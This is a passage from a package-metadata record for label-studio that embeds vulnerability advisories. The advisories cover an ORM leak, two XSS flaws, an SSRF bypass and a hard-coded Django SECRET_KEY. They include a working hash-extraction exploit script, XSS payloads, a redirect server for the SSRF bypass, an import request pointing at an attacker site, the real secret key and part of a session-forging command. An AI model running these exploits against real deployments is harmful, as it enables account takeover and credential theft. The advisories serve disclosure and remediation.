point of the filter chain.\n3. Navigate to the task view for the project and add any filter with the `Network` inspect tab open on the browser. Look for a `PATCH` request to `/api/dm/views/{view_id}?interaction=filter&project={project_id}` and save the `view_id` and `project_id` for the next step.\n4. Download the attached proof of concept exploit script named `labelstudio_ormleak.py`. This script will leak the password hash of the victim account character by character. Run the following command to run the exploit script, replacing the `{view_id}`, `{project_id}`, `{cookie_str}` and `{url}` with the corresponding values. For further explanation run `python3 labelstudio_ormleak.py --help`.\n\n```bash\npython3 labelstudio_ormleak.py -v {view_id} -p {project_id} -c '{cookie_str}' -u '{url}'\n```\n\nThe following example GIF demonstrates exploiting this ORM Leak vulnerability to retrieve the password hash `pbkdf2_sha256$260000$KKeew1othBwMKk2QudmEgb$ALiopdBpWMwMDD628xeE1Ie7YSsKxdXdvWfo/PvVXvw=`.\n\n![labelstudio_ormleak_poc](https://user-images.githubusercontent.com/139727151/266986646-a3d1367c-fb4d-4482-9b6a-18a5d7316385.gif)\n\n# Impact\n\nThis vulnerability can be exploited to completely compromise the confidentiality of highly sensitive account information, such as account password hashes. For all versions `<=1.8.1`, this finding can also be chained with hard coded `SECRET_KEY` to forge session tokens of any user on Label Studio and could be abuse to deteriorate the integrity and availability.\n\n# Remediation Advice\n\n* Do not use unsanitised values for constructing a filter for querying objects using Django's ORM. Django's ORM allows querying by relation field and performs auto lookups, that enable filtering by sensitive fields.\n* Validate filter values to an allow list before performing any queries.\n\n# Discovered\n- August 2023, Alex Brown, elttam\n\n---\n# `labelstudio_ormleak.py` proof of concept\n\n```py\nimport argparse\nimport re\nimport requests\nimport string\nimport sys\n\n# Password hash characters\nCHARS = string.ascii_letters + string.digits + '$/+=_!'\nCHARS_LEN = len(CHARS)\n\nPAYLOAD = {\n    \"data\": {\n        \"columnsDisplayType\": {},\n        \"columnsWidth\": {},\n        \"filters\": {\n            \"conjunction\": \"and\",\n            \"items\": [\n                {\n                    \"filter\": \"filter:tasks:updated_by__active_organization__active_users__password\", # ORM Leak filter chain\n                    \"operator\": \"regex\", # Use regex operator to filter password hash value\n                    \"type\": \"String\",\n                    \"value\": \"REPLACEME\"\n                }\n            ]\n        },\n        \"gridWidth\": 4,\n        \"hiddenColumns\":{\"explore\":[\"tasks:inner_id\"],\"labeling\":[\"tasks:id\",\"tasks:inner_id\"]},\n        \"ordering\": [],\n        \"search_text\": None,\n        \"target\": \"tasks\",\n        \"title\": \"Default\",\n        \"type\": \"list\"\n    },\n    \"id\": 1, # View ID\n    \"project\": \"1\" # Project ID\n}\n\ndef parse_args() -> argparse.Namespace:\n    parser = argparse.ArgumentParser(\n        description='Leak an accounts password hash by exploiting a ORM Leak vulnerability in Label Studio'\n    )\n\n    parser.add_argument(\n        '-v', '--view-id',\n        help='View id of the page',\n        type=int,\n        required=True\n    )\n\n    parser.add_argument(\n        '-p', '--project-id',\n        help='Project id to filter tasks for',\n        type=int,\n        required=True\n    )\n\n    parser.add_argument(\n        '-c', '--cookie-str',\n        help='Cookie string for authentication',\n        required=True\n    )\n\n    parser.add_argument(\n        '-u', '--url',\n        help='Base URL to Label Studio instance',\n        required=True\n    )\n\n    return parser.parse_args()\n\ndef setup() -> dict:\n    args = parse_args()\n    view_id = args.view_id\n    project_id = args.project_id\n    path_1 = \"/api/dm/views/{view_id}?interaction=filter&project={project_id}\".format(\n        view_id=view_id,\n        project_id=project_id\n    )\n    path_2 = \"/api/tasks?page=1&page_size=1&view={view_id}&interaction=filter&project={project_id}\".format(\n        view_id=view_id,\n        project_id=project_id\n    )\n    PAYLOAD[\"id\"] = view_id\n    PAYLOAD[\"project\"] = str(project_id)\n    \n    config_dict = {\n        'COOKIE_STR': args.cookie_str,\n        'URL_PATH_1': args.url + path_1,\n        'URL_PATH_2': args.url + path_2,\n        'PAYLOAD': PAYLOAD\n    }\n    return config_dict\n\ndef test_payload(config_dict: dict, payload) -> bool:\n    sys.stdout.flush()\n    cookie_str = config_dict[\"COOKIE_STR\"]\n    r_set = requests.patch(\n        config_dict[\"URL_PATH_1\"],\n        json=payload,\n        headers={\n            \"Cookie\": cookie_str\n        }\n    )\n\n    r_listen = requests.get(\n        config_dict['URL_PATH_2'],\n        headers={\n            \"Cookie\": cookie_str\n        }\n    )\n\n    r_json = r_listen.json()\n    return len(r_json[\"tasks\"]) >= 1\n\ndef test_char(config_dict, known_hash, c):\n    json_payload_suffix = PAYLOAD\n    test_escaped = re.escape(known_hash + c)\n    json_payload_suffix[\"data\"][\"filters\"][\"items\"][0][\"value\"] =  f\"^{test_escaped}\"\n\n    suffix_result = test_payload(config_dict, json_payload_suffix)\n    if suffix_result:\n        return (known_hash + c, c)\n    \n    return None\n\ndef main():\n    config_dict = setup()\n    # By default Label Studio password hashes start with these characters\n    known_hash = \"pbkdf2_sha256$260000$\"\n    print()\n    print(f\"dumped: {known_hash}\", end=\"\")\n    sys.stdout.flush()\n\n    while True:\n        found = False\n\n        for c in CHARS:\n            r = test_char(config_dict, known_hash, c)\n            if not r is None:\n                new_hash, c = r\n                known_hash = new_hash\n                print(c, end=\"\")\n                sys.stdout.flush()\n                found = True\n                break\n\n        if not found:\n            break\n\n    print()\n\nif __name__ == \"__main__\":\n    main()\n```","fixed_in":["1.9.2.post0"],"id":"GHSA-6hjj-gq77-j4qw","link":"https://osv.dev/vulnerability/GHSA-6hjj-gq77-j4qw","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2024-26152"],"details":"### Summary\nOn all Label Studio versions prior to 1.11.0, data imported via file upload feature is not properly sanitized prior to being rendered within a [`Choices`](https://labelstud.io/tags/choices) or [`Labels`](https://labelstud.io/tags/labels) tag, resulting in an XSS vulnerability.\n\n### Details\nNeed permission to use the \"data import\" function. This was reproduced on Label Studio 1.10.1.\n\n### PoC\n\n1. Create a project.\n![Create a project](https://github.com/HumanSignal/label-studio/assets/3943358/9b1536ad-feac-4238-a1bd-ca9b1b798673)\n\n2. Upload a file containing the payload using the \"Upload Files\" function.\n![2  Upload a file containing the payload using the Upload Files function](https://github.com/HumanSignal/label-studio/assets/3943358/26bb7af1-1cd2-408f-9adf-61e31a5b7328)\n![3  complete](https://github.com/HumanSignal/label-studio/assets/3943358/f2f62774-1fa6-4456-9e6f-8fa1ca0a2d2e)\n\nThe following are the contents of the files used in the PoC\n```\n{\n  \"data\": {\n    \"prompt\": \"labelstudio universe image\",\n    \"images\": [\n      {\n        \"value\": \"id123#0\",\n        \"style\": \"margin: 5px\",\n        \"html\": \"<img width='400' src='https://labelstud.io/_astro/images-tab.64279c16_ZaBSvC.avif' onload=alert(document.cookie)>\"\n      }\n    ]\n  }\n}\n```\n\n3. Select the text-to-image generation labeling template of Ranking and scoring\n![3  Select the text-to-image generation labelling template for Ranking and scoring](https://github.com/HumanSignal/label-studio/assets/3943358/f227f49c-a718-4738-bc2a-807da4f97155)\n![5  save](https://github.com/HumanSignal/label-studio/assets/3943358/9b529f8a-8e99-4bb0-bdf6-bb7a95c9b75d)\n\n4. Select a task\n![4  Select a task](https://github.com/HumanSignal/label-studio/assets/3943358/71856b7a-2b1f-44ea-99ab-fc48bc20caa7)\n\n5. Check that the script is running\n![5  Check that the script is running](https://github.com/HumanSignal/label-studio/assets/3943358/e396ae7b-a591-4db7-afe9-5bab30b48cb9)\n\n### Impact\nMalicious scripts can be injected into the code, and when linked with vulnerabilities such as CSRF, it can cause even greater damage. In particular, It can become a source of further attacks, especially when linked to social engineering.\n","fixed_in":["1.11.0"],"id":"GHSA-6xv9-957j-qfhg","link":"https://osv.dev/vulnerability/GHSA-6xv9-957j-qfhg","source":"osv","summary":null,"withdrawn":null}]},"1.7.3":{"info":{"author":"Heartex","author_email":"hello@heartex.ai","bugtrack_url":null,"classifiers":["License :: OSI Approved :: Apache Software License","Operating System :: OS Independent","Programming Language :: Python :: 3"],"description_content_type":"text/markdown","docs_url":null,"download_url":"","downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":"https://github.com/heartexlabs/label-studio","keywords":"","license":"","maintainer":"","maintainer_email":"","name":"label-studio","package_url":"https://pypi.org/project/label-studio/","platform":null,"project_url":"https://pypi.org/project/label-studio/","project_urls":{"Homepage":"https://github.com/heartexlabs/label-studio"},"provides_extra":null,"release_url":"https://pypi.org/project/label-studio/1.7.3/","requires_dist":["wheel","appdirs (>=1.4.3)","attr (==0.3.1)","attrs (>=19.2.0)","pyyaml (>=5.3.1)","azure-storage-blob (>=12.6.0)","boto (~=2.49.0)","boto3 (~=1.16.28)","botocore (~=1.19.28)","bleach (~=5.0.0)","google-api-core (==2.10.0)","google-auth (==2.11.0)","google-cloud-appengine-logging (==1.1.0)","google-cloud-audit-log (==0.2.0)","google-cloud-core (==2.3.2)","google-cloud-storage (~=2.5.0)","google-cloud-logging (~=2.7.0)","google-resumable-media (==2.3.3)","googleapis-common-protos (==1.56.4)","grpc-google-iam-v1 (==0.12.3)","Django (==3.2.16)","django-storages (==1.12.3)","django-annoying (==0.10.6)","django-debug-toolbar (==3.2.1)","django-filter (==2.4.0)","django-model-utils (==4.1.1)","django-rq (==2.5.1)","django-cors-headers (==3.6.0)","django-extensions (==3.1.0)","django-rest-swagger (==2.2.0)","django-user-agents (==0.4.0)","django-ranged-fileresponse (>=0.1.2)","drf-dynamic-fields (==0.3.0)","djangorestframework (==3.13.1)","drf-flex-fields (==0.9.5)","drf-yasg (==1.20.0)","drf-generators (==0.3.0)","htmlmin (==0.1.12)","jsonschema (==3.2.0)","lockfile (>=0.12.0)","lxml (>=4.2.5)","defusedxml (>=0.7.1)","numpy (==1.21.6)","ordered-set (==4.0.2)","pandas (>=0.24.0)","protobuf (>=3.15.5)","psycopg2-binary (==2.9.6)","pydantic (<=1.11.0,>=1.7.3)","python-dateutil (==2.8.1)","pytz (~=2019.3)","requests (<=2.28,>=2.22.0)","rq (==1.10.1)","rules (==2.2)","ujson (>=3.0.0)","xmljson (==0.2.0)","colorama (>=0.4.4)","boxing (>=0.1.4)","redis (>=4.2.0)","sentry-sdk (>=1.1.0)","launchdarkly-server-sdk (==7.5.0)","python-json-logger (==2.0.4)","label-studio-converter (==0.0.51)","mysqlclient ; extra == 'mysql'"],"requires_python":">=3.6","summary":"Label Studio annotation tool","version":"1.7.3","yanked":false,"yanked_reason":null},"last_serial":25820833,"urls":[{"comment_text":"","digests":{"blake2b_256":"eb180dec17b126b0ce74e51349bdbc0afcf8787a1aa5d18f4019df95b9c1e465","md5":"89ae0b5e4eab4dd9aa772c669b474f5c","sha256":"caa73ccdf71823a49e6ca427d9153aebb4fb8f8e18303423beede95340ed528c"},"downloads":-1,"filename":"label_studio-1.7.3-py3-none-any.whl","has_sig":false,"md5_digest":"89ae0b5e4eab4dd9aa772c669b474f5c","packagetype":"bdist_wheel","python_version":"py3","requires_python":">=3.6","size":47014936,"upload_time":"2023-04-19T12:05:13","upload_time_iso_8601":"2023-04-19T12:05:13.723739Z","url":"https://files.pythonhosted.org/packages/eb/18/0dec17b126b0ce74e51349bdbc0afcf8787a1aa5d18f4019df95b9c1e465/label_studio-1.7.3-py3-none-any.whl","yanked":false,"yanked_reason":null},{"comment_text":"","digests":{"blake2b_256":"332bff76b68ea7bc4abd6557966e896e817a6d14ba0f5f31ddc8006335bf3172","md5":"54056c4b6b471f9e964c461638d1dbd1","sha256":"12784322a00c739b00963967c842f2907e2108daaf1e00abea84446405a45694"},"downloads":-1,"filename":"label-studio-1.7.3.tar.gz","has_sig":false,"md5_digest":"54056c4b6b471f9e964c461638d1dbd1","packagetype":"sdist","python_version":"source","requires_python":">=3.6","size":45996155,"upload_time":"2023-04-19T12:05:18","upload_time_iso_8601":"2023-04-19T12:05:18.724126Z","url":"https://files.pythonhosted.org/packages/33/2b/ff76b68ea7bc4abd6557966e896e817a6d14ba0f5f31ddc8006335bf3172/label-studio-1.7.3.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[{"aliases":["CVE-2023-47116"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to [`1.11.0`](https://github.com/HumanSignal/label-studio/releases/tag/1.11.0) and was tested on version `1.8.2`.\n\n# Overview\n\nLabel Studio's SSRF protections that can be enabled by setting the `SSRF_PROTECTION_ENABLED` environment variable can be bypassed to access internal web servers. This is because the current SSRF validation is done by executing a single DNS lookup to verify that the IP address is not in an excluded subnet range. This protection can be bypassed by either using HTTP redirection or performing a [DNS rebinding attack](https://en.wikipedia.org/wiki/DNS_rebinding).\n\n# Description\n\nThe following `tasks_from_url` method in [`label_studio/data_import/uploader.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_import/uploader.py#L127-L155) performs the SSRF validation (`validate_upload_url`) before sending the request.\n\n```python\ndef tasks_from_url(file_upload_ids, project, user, url, could_be_tasks_list):\n    \"\"\"Download file using URL and read tasks from it\"\"\"\n    # process URL with tasks\n    try:\n        filename = url.rsplit('/', 1)[-1]\n\n        validate_upload_url(url, block_local_urls=settings.SSRF_PROTECTION_ENABLED)\n        # Reason for #nosec: url has been validated as SSRF safe by the\n        # validation check above.\n        response = requests.get(\n            url, verify=False, headers={'Accept-Encoding': None}\n        )  # nosec\n        file_content = response.content\n        check_tasks_max_file_size(int(response.headers['content-length']))\n        file_upload = create_file_upload(\n            user, project, SimpleUploadedFile(filename, file_content)\n        )\n        if file_upload.format_could_be_tasks_list:\n            could_be_tasks_list = True\n        file_upload_ids.append(file_upload.id)\n        tasks, found_formats, data_keys = FileUpload.load_tasks_from_uploaded_files(\n            project, file_upload_ids\n        )\n\n    except ValidationError as e:\n        raise e\n    except Exception as e:\n        raise ValidationError(str(e))\n    return data_keys, found_formats, tasks, file_upload_ids, could_be_tasks_list\n```\n\nThe `validate_upload_url` code in [`label_studio/core/utils/io.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/core/utils/io.py#L174-L209) is shown below.\n\n```python\ndef validate_upload_url(url, block_local_urls=True):\n    \"\"\"Utility function for defending against SSRF attacks. Raises\n        - InvalidUploadUrlError if the url is not HTTP[S], or if block_local_urls is enabled\n          and the URL resolves to a local address.\n        - LabelStudioApiException if the hostname cannot be resolved\n\n    :param url: Url to be checked for validity/safety,\n    :param block_local_urls: Whether urls that resolve to local/private networks should be allowed.\n    \"\"\"\n\n    parsed_url = parse_url(url)\n\n    if parsed_url.scheme not in ('http', 'https'):\n        raise InvalidUploadUrlError\n\n    domain = parsed_url.host\n    try:\n        ip = socket.gethostbyname(domain)\n    except socket.error:\n        from core.utils.exceptions import LabelStudioAPIException\n        raise LabelStudioAPIException(f\"Can't resolve hostname {domain}\")\n\n    if not block_local_urls:\n        return\n\n    if ip == '0.0.0.0':  # nosec\n        raise InvalidUploadUrlError\n    local_subnets = [\n        '127.0.0.0/8',\n        '10.0.0.0/8',\n        '172.16.0.0/12',\n        '192.168.0.0/16',\n    ]\n    for subnet in local_subnets:\n        if ipaddress.ip_address(ip) in ipaddress.ip_network(subnet):\n            raise InvalidUploadUrlError\n```\n\nThe issue here is the SSRF validation is only performed before the request is sent, and does not validate the destination IP address. Therefore, an attacker can either redirect the request or perform a DNS rebinding attack to bypass this protection.\n\n# Proof of Concept\n\nBoth the HTTP redirection and DNS rebinding methods for bypassing Label Studio's SSRF protections are explained below.\n\n### HTTP Redirection\n\nThe python `requests` module automatically follows HTTP redirects (eg. response code `301` and `302`). Therefore, an attacker could use a URL shortener (eg. `https://www.shorturl.at/`) or host the following Python code on an external server to redirect request from a Label Studio server to an internal web server.\n\n```python\nfrom http.server import BaseHTTPRequestHandler, HTTPServer\n\nclass RedirectHandler(BaseHTTPRequestHandler):\n\n    def do_GET(self):\n        self.send_response(301)\n        # skip first slash\n        self.send_header('Location', self.path[1:])\n        self.end_headers()\n\nHTTPServer((\"\", 8080), RedirectHandler).serve_forever()\n```\n\n### DNS Rebinding Attack\n\nDNS rebinding can bypass SSRF protections by resolving to an external IP address for the first resolution, but when the request is sent resolves to an internal IP address that is blocked. For an example, the domain `7f000001.030d1fd6.rbndr.us` will randomly switch between the IP address `3.13.31.214` that is not blocked to `127.0.0.1` which is not allowed.\n\n# Impact\n\nSSRF vulnerabilities pose a significant risk on cloud environments, since instance credentials are managed by internal web APIs. An attacker can bypass Label Studio's SSRF protections to access internal web servers and partially compromise the confidentiality of those internal servers.\n\n# Remediation Advice\n\n* Before saving any responses, validate the destination IP address is not in the deny list.\n* Consider blocking internal cloud API IP ranges to mitigate the risk of compromising cloud credentials.\n\n# Discovered\n- August 2023, Alex Brown, elttam","fixed_in":["1.11.0"],"id":"GHSA-p59w-9gqw-wj8r","link":"https://osv.dev/vulnerability/GHSA-p59w-9gqw-wj8r","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2023-47115"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to `1.9.2` and was tested on version `1.8.2`.\n\n# Overview\n\n[Label Studio](https://github.com/HumanSignal/label-studio) has a cross-site scripting (XSS) vulnerability that could be exploited when an authenticated user uploads a crafted image file for their avatar that gets rendered as a HTML file on the website.\n\n# Description\n\nThe following [code snippet in Label Studio](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/users/functions.py#L18-L49) shows that the only verification check is that the file is an image by extracting the dimensions from the file.\n\n```python\n\ndef hash_upload(instance, filename):\n    filename = str(uuid.uuid4())[0:8] + '-' + filename\n    return settings.AVATAR_PATH + '/' + filename <3>\n\n\ndef check_avatar(files):\n    images = list(files.items())\n    if not images:\n        return None\n\n    filename, avatar = list(files.items())[0]  # get first file\n    w, h = get_image_dimensions(avatar) <1>\n    if not w or not h:\n        raise forms.ValidationError(\"Can't read image, try another one\")\n\n    # validate dimensions\n    max_width = max_height = 1200\n    if w > max_width or h > max_height:\n        raise forms.ValidationError('Please use an image that is %s x %s pixels or smaller.'\n                                    % (max_width, max_height))\n\n    # validate content type\n    main, sub = avatar.content_type.split('/') <2>\n    if not (main == 'image' and sub.lower() in ['jpeg', 'jpg', 'gif', 'png']):\n        raise forms.ValidationError(u'Please use a JPEG, GIF or PNG image.')\n\n    # validate file size\n    max_size = 1024 * 1024\n    if len(avatar) > max_size:\n        raise forms.ValidationError('Avatar file size may not exceed ' + str(max_size/1024) + ' kb')\n\n    return avatar\n```\n1. Attempts to get image dimensions to validate the uploaded avatar file is an image.\n2. Extracts the `Content-Type` from the upload `POST` request. A user can easily bypass this verification by changing the mimetype of the uploaded file to an allowed type (eg. `image/jpeg`).\n3. The file extension of the uploaded file is never validated and is saved to the filesystem.\n\n[Label Studio serves avatar images using Django's built-in `serve` view](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/users/urls.py#L25-L26), which is [not secure for production use according to Django's documentation](https://docs.djangoproject.com/en/4.2/ref/views/#serving-files-in-development).\n\n```python\n    re_path(r'^data/' + settings.AVATAR_PATH + '/(?P<path>.*)$', serve,\n            kwargs={'document_root': join(settings.MEDIA_ROOT, settings.AVATAR_PATH)}),\n```\n\nThe issue with the Django `serve` view is that it determines the `Content-Type` of the response by the file extension in the URL path. Therefore, an attacker can upload an image that contains malicious HTML code and name the file with a `.html` extension to be rendered as a HTML page. The only file extension validation is performed on the client-side, which can be easily bypassed.\n\n# Proof of Concept\n\nBelow are the steps to reproduce this issue and execute JavaScript code in the context of the Label Studio website.\n\n1. Using any JPEG or PNG image, add in the comment field in the metadata the HTML code `<script>alert(document.domain)</script>`. This can be done using the `exiftool` command as shown below that was used to create the following image.\n\n```bash\nexiftool -Comment='<script>alert(document.domain)</script>' penguin.jpg\n```\n\n![xss-penguin](https://user-images.githubusercontent.com/139727151/266989884-c2cd9b4f-f374-416e-a468-acf41f52e088.jpg)\n\n2. On Label Studio, navigate to account & settings page and intercept the upload request of the avatar image using a tool such as Burp Suite. Modify the filename in the request to have a `.html` extension.\n\n3. Right click the image on the avatar profile and copy the URL. Send this to a victim and it will display an alert box with the host name of the Label Studio instance as shown below.\n\n![xss-alert](https://user-images.githubusercontent.com/139727151/266989952-6fb74c6e-9961-447c-a602-5a6f36627ae6.png)\n\n# Impact\n\nExecuting arbitrary JavaScript could result in an attacker performing malicious actions on Label Studio users if they visit the crafted avatar image. For an example, an attacker can craft a JavaScript payload that adds a new Django Super Administrator user if a Django administrator visits the image.\n\n# Remediation Advice\n\n* Validate the file extension on the server side, not in client-side code.\n* Remove the use of Django's `serve` view and implement a secure controller for viewing uploaded avatar images.\n* Consider saving file content in the database rather than on the filesystem to mitigate against other file related vulnerabilities.\n* Avoid trusting user controlled inputs.\n\n# Discovered\n- August 2023, Alex Brown, elttam","fixed_in":["1.9.2"],"id":"GHSA-q68h-xwq5-mm7x","link":"https://osv.dev/vulnerability/GHSA-q68h-xwq5-mm7x","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2024-23633"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to `1.10.1` and was tested on version `1.9.2.post0`.\n\n# Overview\n\n[Label Studio](https://github.com/HumanSignal/label-studio) had a remote import feature allowed users to import data from a remote web source, that was downloaded and could be viewed on the website. This feature could had been abused to download a HTML file that executed malicious JavaScript code in the context of the Label Studio website.\n\n# Description\n\nThe following [code snippet in Label Studio](https://github.com/HumanSignal/label-studio/blob/1.9.2.post0/label_studio/data_import/uploader.py#L125C5-L146) showed that is a URL passed the SSRF verification checks, the contents of the file would be downloaded using the filename in the URL.\n\n```python\ndef tasks_from_url(file_upload_ids, project, user, url, could_be_tasks_list):\n    \"\"\"Download file using URL and read tasks from it\"\"\"\n    # process URL with tasks\n    try:\n        filename = url.rsplit('/', 1)[-1] <1>\n\n        response = ssrf_safe_get(\n            url, verify=project.organization.should_verify_ssl_certs(), stream=True, headers={'Accept-Encoding': None}\n        )\n        file_content = response.content\n        check_tasks_max_file_size(int(response.headers['content-length']))\n        file_upload = create_file_upload(user, project, SimpleUploadedFile(filename, file_content))\n        if file_upload.format_could_be_tasks_list:\n            could_be_tasks_list = True\n        file_upload_ids.append(file_upload.id)\n        tasks, found_formats, data_keys = FileUpload.load_tasks_from_uploaded_files(project, file_upload_ids)\n\n    except ValidationError as e:\n        raise e\n    except Exception as e:\n        raise ValidationError(str(e))\n    return data_keys, found_formats, tasks, file_upload_ids, could_be_tasks_list\n```\n1. The file name that was set was retrieved from the URL.\n\nThe downloaded file path could then be retrieved by sending a request to `/api/projects/{project_id}/file-uploads?ids=[{download_id}]` where `{project_id}` was the ID of the project and `{download_id}` was the ID of the downloaded file. Once the downloaded file path was retrieved by the previous API endpoint, the [following code snippet](https://github.com/HumanSignal/label-studio/blob/1.9.2.post0/label_studio/data_import/api.py#L595C1-L616C62) demonstrated that the `Content-Type` of the response was determined by the file extension, since `mimetypes.guess_type` guesses the `Content-Type` based on the file extension.\n\n```python\nclass UploadedFileResponse(generics.RetrieveAPIView):\n    permission_classes = (IsAuthenticated,)\n\n    @swagger_auto_schema(auto_schema=None)\n    def get(self, *args, **kwargs):\n        request = self.request\n        filename = kwargs['filename']\n        # XXX needed, on windows os.path.join generates '\\' which breaks FileUpload\n        file = settings.UPLOAD_DIR + ('/' if not settings.UPLOAD_DIR.endswith('/') else '') + filename\n        logger.debug(f'Fetch uploaded file by user {request.user} => {file}')\n        file_upload = FileUpload.objects.filter(file=file).last()\n\n        if not file_upload.has_permission(request.user):\n            return Response(status=status.HTTP_403_FORBIDDEN)\n\n        file = file_upload.file\n        if file.storage.exists(file.name):\n            content_type, encoding = mimetypes.guess_type(str(file.name)) <1>\n            content_type = content_type or 'application/octet-stream'\n            return RangedFileResponse(request, file.open(mode='rb'), content_type=content_type)\n        else:\n            return Response(status=status.HTTP_404_NOT_FOUND)\n```\n1. Determines the `Content-Type` based on the extension of the uploaded file by using `mimetypes.guess_type`.\n\nSince the `Content-Type` was determined by the file extension of the downloaded file, an attacker could import in a `.html` file that would execute JavaScript when visited.\n\n# Proof of Concept\n\nBelow were the steps to recreate this issue:\n\n1. Host the following HTML proof of concept (POC) script on an external website with the file extension `.html` that would be downloaded to the Label Studio website.\n\n```html\n<html>\n    <body>\n        <h1>Data Import XSS</h1>\n        <script>\n            alert(document.domain);\n        </script>\n    </body>\n</html>\n```\n\n2. Send the following `POST` request to download the HTML POC to the Label Studio and note the returned ID of the downloaded file in the response. In the following POC the `{victim_host}` is the address and port of the victim Label Studio website (eg. `labelstudio.com:8080`), `{project_id}` is the ID of the project where the data would be imported into, `{cookies}` are session cookies and `{evil_site}` is the website hosting the malicious HTML file (named `xss.html` in the following example).\n\n```http\nPOST /api/projects/{project_id}/import?commit_to_project=false HTTP/1.1\nHost: {victim_host}\nAccept: */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\ncontent-type: application/x-www-form-urlencoded\nContent-Length: 43\nConnection: close\nCookie: {cookies}\nPragma: no-cache\nCache-Control: no-cache\n\nurl=https://{evil_site}/xss.html\n```\n\n3. To retrieve the downloaded file path could be retrieved by sending a `GET` request to `/api/projects/{project_id}/file-uploads?ids=[{download_id}]`, where `{download_id}` is the ID of the file download from the previous step.\n\n4. Send your victim a link to `/data/{file_path}`, where `{file_path}` is the path of the downloaded file from the previous step. The following screenshot demonstrated executing the POC JavaScript code by visiting `/data/upload/1/cfcfc340-xss.html`.\n\n![xss-import-alert](https://user-images.githubusercontent.com/139727151/282223222-d8f9132c-838e-4aa6-9c03-a2bc83b4a409.png)\n\n# Impact\n\nExecuting arbitrary JavaScript could result in an attacker performing malicious actions on Label Studio users if they visit the crafted avatar image. For an example, an attacker can craft a JavaScript payload that adds a new Django Super Administrator user if a Django administrator visits the image.\n\n# Remediation Advice\n\n* For all user provided files that are downloaded by Label Studio, set the `Content-Security-Policy: sandbox;` response header when viewed on the site. The `sandbox` directive restricts a page's actions to prevent popups, execution of plugins and scripts and enforces a `same-origin` policy ([documentation](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/sandbox)).\n* Restrict the allowed file extensions that could be downloaded.\n\n# Discovered\n- August 2023, Alex Brown, elttam","fixed_in":["1.10.1"],"id":"GHSA-fq23-g58m-799r","link":"https://osv.dev/vulnerability/GHSA-fq23-g58m-799r","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2023-43791"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability was found to affect versions before `1.8.2`, where a patch was introduced.\n\n# Overview\n\nIn [Label Studio version 1.8.1](https://github.com/HumanSignal/label-studio/tree/1.8.1), a hard coded Django `SECRET_KEY` was set in the application settings. The Django `SECRET_KEY` is used for signing session tokens by the web application framework, and should never be shared with unauthorised parties.\n\nHowever, the Django framework inserts a `_auth_user_hash` claim in the session token that is a HMAC hash of the account's password hash. That claim would normally prevent forging a valid Django session token without knowing the password hash of the account. However, any authenticated user can exploit an Object Relational Mapper (ORM) Leak vulnerability in Label Studio to leak the password hash of any account on the platform, which is reported as a separate vulnerability. An attacker can exploit the ORM Leak vulnerability (which was patched in [`1.9.2post0`](https://github.com/HumanSignal/label-studio/releases/tag/1.9.2.post0)) and forge session tokens for all users on Label Studio using the hard coded `SECRET_KEY`.\n\n# Description\n\nBelow is the code snippet of the Django settings file at [`label_studio/core/settings/base.py`](https://github.com/HumanSignal/label-studio/blob/1.8.1/label_studio/core/settings/base.py#L108).\n\n```python\n# SECURITY WARNING: keep the secret key used in production secret!\nSECRET_KEY = '$(fefwefwef13;LFK{P!)@#*!)kdsjfWF2l+i5e3t(8a1n'\n```\n\nThis secret is hard coded across all instances of Label Studio.\n\n# Proof of Concept\n\nBelow are the steps that an attacker could do to forge a session token of any account on Label Studio:\n\n1. Exploit the ORM Leak vulnerability (patched in [`1.9.2post0`](https://github.com/HumanSignal/label-studio/releases/tag/1.9.2.post0)) in Label Studio to retrieve the full password hash that will be impersonated. For this example, a session token will be forged for an account with the email `ghostccamm@testvm.local` with the password hash `pbkdf2_sha256$260000$KKeew1othBwMKk2QudmEgb$ALiopdBpWMwMDD628xeE1Ie7YSsKxdXdvWfo/PvVXvw=` that was retrieved.\n\n2. Create a new Django project with an empty application. In `cookieforge/cookieforge/settings.py` set the `SECRET_KEY` to `$(fefwefwef13;LFK{P!)@#*!)kdsjfWF2l+i5e3t(8a1n`. Create a management command with the following code that will be used to create forged session tokens.\n\n```python\nfrom typing import Any\nfrom django.core.management.base import  BaseCommand, CommandParser\nfrom django.core import signing\nfrom django.utils.crypto import salted_hmac\nfrom django.conf import settings\nimport time, uuid\n\nclass Command(BaseCommand):\n    help = \"Forge a users session cookie on Label Studio\"\n\n    def add_arguments(self, parser: CommandParser) -> None:\n        parser.add_argument(\n            '-o', '--organisation',\n            help='Organisation ID to access',\n            default=1,\n            type=int\n        )\n\n        parser.add_argument(\n            'user_id',\n            help='The User ID of the victim you want to impersonate',\n            type=str\n        )\n\n        parser.add_argument(\n            'user_hash',\n            help='The password hash the user you want to impersonate'\n        )\n\n    def handle(self, *args: Any, **options: Any) -> str | None:\n        key = settings.SECRET_KEY\n        # Creates the _auth_user_hash HMAC of the victim's password hash\n        auth_user_hash = salted_hmac(\n            'django.contrib.auth.models.AbstractBaseUser.get_session_auth_hash',\n            options['user_hash'],\n            secret=key,\n            algorithm=\"sha256\"\n        ).hexdigest()\n\n        session_dict = {\n            'uid': str(uuid.uuid4()), \n            'organization_pk': options['organisation'], \n            'next_page': '/projects/', \n            'last_login': time.time(), \n            '_auth_user_id': options['user_id'], \n            '_auth_user_backend': \n            'django.contrib.auth.backends.ModelBackend', \n            